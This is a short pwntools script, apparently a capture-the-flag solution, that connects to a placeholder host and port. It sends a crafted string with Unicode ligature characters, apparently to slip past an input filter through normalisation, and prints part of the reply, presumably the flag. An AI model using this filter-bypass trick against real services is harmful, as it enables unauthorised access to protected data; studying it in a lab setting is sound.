from pwn import *
io = remote("<ip>","<port>")
io.sendline("{}[ﬂaĳ]")
print(io.recvall().decode().split(":")[3].strip())